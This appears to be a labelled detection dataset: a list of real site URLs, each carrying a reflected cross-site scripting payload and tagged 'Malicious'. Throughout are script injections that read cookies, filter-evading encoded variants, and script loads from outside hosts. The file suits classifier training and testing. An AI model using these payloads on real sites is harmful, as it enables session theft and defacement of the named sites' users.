http://sesrovires.fotocat.info/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://patimg1.uspto.gov/.piw?docid=%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;sectionnum=3&amp;idk<br>ey=1e9412e00ef6&amp;homeurl=http:%2f%2fpatft.uspto.gov%2fnetacgi%2fnph-parser%3fsect2%3dpto1%2526sect2%3<br>dhitoff%2526p%3d1%2526u%3d%25252fnetahtml%25252fpto%25252fsearch-bool.html%2526r%3d1%2526f%3dg%2526l<br>%3d50%2526d%3dpall%2526s1%3d6338148.pn.%2526os%3dpn%2f6338148%2526rs%3dpn%2f6338148,Malicious
http://www.shssh.gov.al/subindex.php?faqe=news&amp;id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://kikuz0u.x0.com/td/?year=2006'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3<br>e;month=1h;category=l,Malicious
http://www.baby.url.tw/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70<br>%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%<br>31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%3<br>1%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.download2you.com/downloads.asp?txtsearch=%3cscript%3ealert(123)%3c%2fscript%3e&amp;search.x=0<br>&amp;search.y=0,Malicious
"http://www.phpriot.com/search?q=/""><script>alert('xss by atm0n3r')</script>&x=47&y=14",Malicious
http://www.poland.gov.pl/index.php?document=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.informatik.uni-trier.de/ley/dbbin/dblpquery.cgi?title=%22%3e%27%3e%3cscript%3ealert(123)%<br>3c/script%3e&amp;query=search,Malicious
http://www.nae.edu/nae/pubundcom.nsf/webviews/wtop+radio+series+on+engineering+by+date:?opendocument<br>&amp;amp;year=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/script&gt;,Malicious
http://search.aol.com.au/aol/search?query=xssploit&amp;rp=%22%27%3e%3cscript%3ealert%28%27xss+found+by+s<br>mokey%27%29%3b%3c%2fscript%3e%3c%21--,Malicious
http://www.suagacollection.com/photo-gallery.php?id=1%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.coe.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello%20the%20rat')<br>%3c/script%3e,Malicious
http://albany.bizjournals.com/dallas/stories/2007/07/23/tidbits4.html?jst=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/<br>script&gt;,Malicious
http://adt-bs.de/direct_order.php?message=%3c/font%3e%3cscript%3ealert(123)%3c/script%3e&amp;lang=en&amp;sid<br>=742ccab62f32ea9b418a5846284c9f8c,Malicious
http://www.britannica.com/bps/search?query=%3c/textarea%3e'%22%3e%3cscript%3ealert('naber%20nap%fdyo<br>n%20kerhaneci%20rapci%20:d')%3c/script%3e#search=tab~documents%2cterm~%3c%2ftextarea%3e'&amp;tab=active~<br>home%2citems~home%3e%2fbps%2fhome&amp;title=britannica%20online%20encyclopedia,Malicious
http://genbako.dyndns.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/scri<br>pt%3e,Malicious
http://www.velocityclicks.com/index.php?view=join&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!--<br>,Malicious
http://www.intoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
http://content.scholastic.com/browse/searchhelp.jsp?query='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e<br>%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.us-ipy.gov/portals/0/ipysearch/searchresults.aspx?searchval=%22%22%3e%3e%3c%3c/script%3e%<br>3cimg%20%22%22%22%3e%3cscript%3ealert(/xss/)%3c/script%3e%22%3e%3e%3c%3cbody%20onload=prompt(documen<br>t.domain)%3e,Malicious
http://xss.in/more.php?id=228_0_1_0_m%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://direct-secure.motorola.com/contactus/contactmotorolatur.asp?country=&quot;&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;,Malicious
http://www.military.com/resources/historysubmittedfileview?file=%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.paa.gov.pl/?frame=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/script%3e,Malicious
http://www.patakitimi.com/patakitimi/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://service.govdelivery.com/service/multi_subscribe.html?code=%3cscript%3ealert('naber_kardesim_h<br>ayirli_olsun=)');%3c/script%3e,Malicious
http://www.gletherow.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pc-koubou.jp/goods/keycampaign.php?vp=3&amp;pp=&amp;pc=10&amp;m=&amp;mk=&amp;sp1=&amp;dl=&amp;nw=&amp;rc=&amp;nk=&amp;c=&amp;c1=&amp;c2=&amp;<br>dl=&amp;mn=&amp;gn=&amp;price=&amp;cn=&amp;ln=&amp;etc=&amp;color=&amp;sort=nm&amp;s=&amp;ak=&amp;cam_no=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://forum.modopo.com/downloads.php?do=cat&amp;id=22%22%3e%3cscript%3ealert(%22critia!!%20vbulletin%20<br>xssed%20\ncookie%20editor%22)%3c/script%3e,Malicious
http://www.viskascia.lt/prekes_popup.php?lan=lt&amp;pid=192&amp;apr=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
"http://drug-accutane.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
http://www.htsns.com/nic_board/read.php?table=qna&amp;no=10662&amp;page=4'&quot;&gt;&lt;script&gt;alert(1337)&lt;%2fscript&gt;&lt;m<br>arquee&gt;&quot;&gt;&lt;h1&gt;ss+by+xylitol&lt;%2fh1&gt;&lt;%2fmarque&gt;,Malicious
http://www.clasificadostodomexico.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bankofamerica.com/remax/?siteid=%22/%3e%3cscript%20src=http://ha.ckers.org/xss.js%3e,Malicious
http://www.xixixi.jp/xixixi3/j/mmenu.php?scd=1&amp;qs=scd=1&amp;qs=&amp;idp=&amp;kno=&amp;idp=%22%3e'%3e%3cscript%3ealer<br>t('x')%3c/script%3e&amp;kno=,Malicious
http://www.iso.org/iso/pressrelease.htm?archive=%22%3e%3cscript%3ealert(/xssed%20by%20dr.optix/)%3c/<br>script%3e,Malicious
http://www.egetv.com.tr/kategori/haberdetay.asp?haberid=6795&amp;kategoriadi=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://www.turkbreakdance.com/video_islem.asp?vd_kt_id=31&amp;vd_kt_adi=&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&amp;vd_id=100&amp;vd_adi=urban%20games&amp;islem=izle,Malicious
http://forum.univ-poitiers.fr/template/etu/affiche.asp?num=40695&amp;grp=17370&amp;nf=sans-fil%27%22%3e%3c/t<br>itle%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e,Malicious
http://depts.washington.edu/alumni/dawgdeals/yellowresult.php?goal=detail&amp;ckey=1116&amp;primaryfield=cat<br>egory&amp;category=*&amp;texttofind=&quot;&gt;&lt;script&gt;alert(/pyske/)&lt;/script&gt;,Malicious
http://www.crazyaboutgadgets.com/search/?criteria=%22%3e%3ciframe+src%3djavascript%3aalert(123)%3e&amp;c<br>ategory=all,Malicious
http://www.republic.co.uk/bin/venda?ex=co_wizr-locayta&amp;template=wz_locayta&amp;pageno=1&amp;perpage=12&amp;colla<br>te=pdxtgndr%3abrand%3aivtype&amp;termorder=pdxtgndr%3abrand%3aivtype&amp;fieldrtype=type&amp;termtextrtype=invt&amp;<br>typertype=exact&amp;fieldpdxtgndr=pdxtgndr&amp;typepdxtgndr=exact&amp;termtextpdxtgndr=&amp;fieldbrand=brand&amp;typebra<br>nd=exact&amp;termtextbrand=&amp;fieldivtype=ivtype&amp;typeivtype=exact&amp;termtextivtype=&amp;typekeywordsearch=keywor<br>d&amp;termtextkeywordsearch=%3cscript%3ealert%28%22bl4ck%22%29%3c%2fscript%3e,Malicious
http://ir.rolls-royce.com/rr/investors/navp/search?freesearch=%22%3e%3cscript%3ealert%280%29%3c%2fsc<br>ript%3e&amp;x=55&amp;y=15&amp;conf=htdig.rolls_switchover,Malicious
http://www.met.police.uk/cgi-bin/htsearch?words='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%<br>3c/script%3e&amp;btnsearch.x=&amp;btnsearch.y=&amp;config=metpolice&amp;restrict=,Malicious
http://www.4payeh.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.canael.co.jp/a-news.cgi?date=2007.10.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65<br>%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%<br>31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%3<br>6%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
"http://www.clg-brassens-boucbelair.ac-aix-marseille.fr/spip/?calendrier_mois=6&calendrier_annee=2010""><script>alert(1337)</script>",Malicious
http://www.dzit.gov.sa/en/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscrip<br>t%3e&amp;x=14&amp;y=11,Malicious
http://www.wnd.com/index.php?fa=http://google.com?%3cscript%3ealert(document.cookie);%3c/script%3e&amp;p<br>ageid=1,Malicious
http://www.atomintersoft.com/ping?host=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
http://docbweb.ispa.pt/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=<br>2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cebvideo.com/ara.php?sayfa=5&amp;kelime=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://arama.mynet.com/?pg=q&amp;q=salak-mynet(:&amp;i=turke%20y&amp;done=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;[/,Malicious
http://www.fedecegeps.qc.ca/index.php?section=14%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e,Malicious
http://cgi.din.or.jp/~osayo/cgi/diary/diary.cgi?action=move&amp;year=200'%3e%22%3e'%3e%3cscript%3ealert(<br>%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.tufanbeyli.org/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedby<br>cicosz&quot;)&lt;/script&gt;,Malicious
http://www.westbengaltourism.gov.in/application/img_maint/search.php?catagory=%22%3e%3cscript%3ealer<br>t(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marq<br>uee%3e,Malicious
http://search.botbot.com/bot/m/k.html$a9482159760?%22%3e%3cscript%3ealert%28%2ftest%2f%29%3c%2fscrip<br>t%3e,Malicious
http://www.motour.ch/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://grahamschool.uchicago.edu/credit_bearing/program.cfm?programid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://www.netster.com/search_redirect.php?keywords=%22%3e%3ciframe%20src=javascript:alert(123)%3e,Malicious
http://www.fragata.com.br/pedidostatuslog.asp?msg=%3cscript%3ealert(666)%3c/script%3e,Malicious
http://www.psychologypracticals.com/aspx/..%5chtml%5csearch.asp?searchfor=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;<br>/script&gt;,Malicious
http://www.cashloopholes.co.uk/gambling-loopholes-secrets/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/mar<br>quee&gt;,Malicious
http://www.onradio.gr/player.php?id=229%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.performans.saglik.gov.tr/index.php?pid=54&amp;a=%22%3e%3cscript%3ealert(%22virtual_system%22)<br>%3c/script%3e,Malicious
http://www.f4customs.com/install_pages.php?id=8%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.zappos.com/n/bl/l/z/c/all/type/all.html?zv=201%27%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://www.seoghoer.dk/layouts/seoghoer/sewebtvqbrick.aspx?vid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://www.dwds.de/?kompakt=1&amp;sh=1&amp;qu=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e,Malicious
http://search.dunyagazetesi.com.tr/?s=%3cscript+src=http://starext.by.ru/lt.js%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenoms-de-celebrites.asp?prenom=%22%3e%3cl<br>ink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3e,Malicious
http://www.search.org/search/default.asp?yider=%22%3e%3cscript%3ealert(%22by+panzerturk%22)%3c/scrip<br>t%3e,Malicious
http://stats.sympatico.msn.ca/cfl/teamstats.asp?type=&quot;&gt;&lt;script<br>src=http://byccc.awardspace.com/js/xssccc.js&gt;&lt;/script&gt;&amp;teamno=5611&amp;submit=go,Malicious
http://www.bayonne.fr/popup/webcam.asp?name=paulbert&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://chanel-news.chanel.com/en/?s=%3cmarquee%3enews!%20insecurity.ro!%3c/marquee%3e%3cimg%20src=%2<br>2http://i56.tinypic.com/2qw09p5.gif%22%20style=%22height:%20200px;%20width:%20200px;%22%20alt=%22by%<br>20s%22%3e%22%3e%3ciframe+src+%3dhttp://www.youtube.com/watch?v=bq5mekugwum%22+width%3d%221050%22+hei<br>ght%3d%221000%22+\%3e%3c%2fdiv%3e,Malicious
http://www.sie.ac.uk/index.cfm/display_page/home/?action=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.ebookpdf.net/search.php?search=%3cscript%3ealert%281%29%3c%2fscript%3e,Malicious
http://lic.gov.lv/index.php?p=780&amp;lang=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://www.anahost.com/_signup.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.annonces.luxweb.com/mostviewed.php?catid=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://indexed.webmasterhome.cn/history.asp?domain=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.cora.de/advanced_search_result.php?keywords=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;<br>x=0,Malicious
http://myespn.go.com/myespn/includes/communityads?titlecolor=0;}&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;&amp;amp;bodycolor=boobs&amp;amp;urlcolor=balls&amp;amp;backcolor=penis&amp;amp;extpadcolor=dic<br>k&amp;amp;intpadcolor=testicles,Malicious
http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,Malicious
http://wwwww.observatoire-pesticides.gouv.fr/index.php?pageid=1260&amp;parentid=619&quot;&gt;&lt;script&gt;alert(1)&lt;/s<br>cript&gt;,Malicious
http://handmark.resultspage.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0,Malicious
http://ikizdere.meb.gov.tr/arama.asp?tarihte=ara&amp;gun=31&amp;ay=2&amp;yil=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://guarico.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
http://cgi25.plala.or.jp/stcreek/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-<br>%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://gallery.consurance.de/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://stick.newsplus.jp/id.cgi?word=%3cscript%3ealert(%22kusomiso.com%22)%3c/script%3e,Malicious
"http://www.ibk.co.kr/common/error/browser.jsp?returnurl=""><script>alert(document.cookie)</script>",Malicious
http://scuolainospedale.istruzione.it/portal/servizi/news.jsp?stile=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://ubisoftpoint.ubisoft.it/puntivendita.php?id_provincia=37%27%22%3e%3cmarquee%3e%3cimg%20src=k.<br>png%20onerror=alert(/xss/.source)%20/%3e,Malicious
http://www.aim25.ac.uk/cgi-bin/thesaurus/unesco_thes_search?keyword=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.citefa.gov.ar/index.php?idsec=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://vip.hr/sp/show?lr=&amp;hl=&amp;oe=&amp;ie=&amp;q=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%<br>3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%2<br>81%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520<br>align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d1<br>0000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3c<br>plaintext%3e&amp;cof=&amp;idc=25001579&amp;srchstr=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3<br>e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%28<br>1%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520a<br>lign%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10<br>000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cp<br>laintext%3e&amp;podrucje=music&amp;submit=tra%aei,Malicious
"http://www.eesc.europa.eu/scripts/results_en.asp?searchstring=';alert(string.fromcharcode(83,69,67,8<br>5,82,73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22<br>;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,<br>69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcod<br>e(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e&amp;search_lang=",Malicious
"http://researchguides.library.wisc.edu/searchtags.php?iid=&amp;tag=%27;alert%28string.fromcharcode%2888,<br>83,83%29%29//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888<br>,83,83%29%29//\%22;alert%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3csc<br>ript%3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.newsvine.com/_tools/view/history?filter=%22'%3e%3c/script%3e%3cscript%3ealert(document.co<br>okie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%<br>3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3<br>e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h<br>1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%<br>3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3<br>e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h<br>1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%<br>3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3<br>e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h<br>1%3e%3c/marquee%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ing.ch/contact.asp?language=en&eam=true&texte=</textarea><script%20%0a%0d>alert('xss%20by%20turkpower%20-%20from%20turkey')%3b</script><h1>xss%20by%20turkpower%20-%20from%20turkey</h1>,Malicious
http://search.iwon.com/commerce/cached.jsp?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script<br>%3e,Malicious
http://arctic-change2008.com/index.php?fa=%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
"http://www.ittg.edu.mx/contenido.php?id=%27;alert%28string.fromcharcode%2888,83,83%29%29//\%27;alert<br>%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%29//\%22;aler<br>t%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.f<br>romcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.usmint.gov/kids/teachers/lessonplans/50sq/download.cfm?grade=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.worldwidepay.com/index.php?read=%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3cscript%20src=http://infysec.net/x.js%3e%3c/script%3e,Malicious
http://www.c4ni.com/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.hotscripts.com/helpdesk/index.php?mod_id=2&amp;kb_ask=%22%3e%3cscript%3e+alert%28%22hacked by<br>deli hacker %22%29+%3c%2fscript%3e,Malicious
http://www.zdnet.co.kr/search/?search%5bcollection%5d=&amp;search%5bq%5d=%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c%2fscript%3e&amp;x=31&amp;y=7,Malicious
http://9gag.com/signup?method=email&error=%3cscript%3ealert%28%27xss!%27%29;%3c/script%3e,Malicious
http://portal.unesco.org/search/ui/searchservlet?formname=test2&amp;hindexname=ami_index&amp;nbresultbypage=<br>25&amp;hurltemplateresult=http%3a%2f%2fportal.unesco.org%2fsearch%2fen%2fresults.html&amp;output=text%2fhtml<br>&amp;hprefpages=prefpages&amp;hprmetaweight=&amp;hprwordlistweight=7&amp;hprtitlefield=7&amp;hprdescriptionfield=3&amp;hprre<br>ferencefield=10&amp;rthesaurus=&amp;tuserinput=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthi<br>rdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e&amp;fok.x=12&amp;fok.y=12,Malicious
http://www.frieschepaard.nl/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.smogcheck.ca.gov/stdpage.asp?body=%22%3e%3cscript%3ealert(%22x%22);%3c/script%3e,Malicious
http://www.kickme.to/register.php?error=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://mk-board.net/ime.cgi?http://%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2<br>ejs%3e%3c%2fscript%3e,Malicious
http://www.territoriomedico.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.lcsd.gov.hk/members'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;xss by<br>xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.caglar-petshop.com/default.asp?s=irksec&amp;id=1&amp;k=%3cscript%3ealert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.seckinkoleji.com/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://annunci.repubblica.it/data/uploadattachment.php?type=322667%22%3e%3cscript%3ealert(document.c<br>ookie)%3c/script%3e,Malicious
http://www.thainavigation.com/news_list.php?type_id=1'%3e%22%3e%3ciframe%20src=http://kusomiso.com/x<br>ss.html%20%3c,Malicious
http://www.area49rtbi.org/dundee/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://recruit.cns.gov/quicksearchresults.asp?source=save&amp;servicearea=1&amp;serviceareaerr=0&amp;program=99<br>&amp;programerr=0&amp;schedule=&amp;scheduleerr=0&amp;state=%27al%27&amp;stateerr=0&amp;keyword=%3cscript+src%3dhttp%3a%2f%2<br>fha.ckers.org%2fxss.js%3e%3c%2fscript%3e&amp;keyworderr=0,Malicious
"http://photobucket.com/mediadetail/?media=';alert(string.fromcharcode(88,83,83))//\';alert(string.fr<br>omcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,8<br>3,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
https://sindominio.net/net2ftp/index.php?state=login_small&amp;state2=admin&amp;go_to_state=%22%3e'%3e%22%3c<br>'%3c%3cscript%3e%3c/script%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e],Malicious
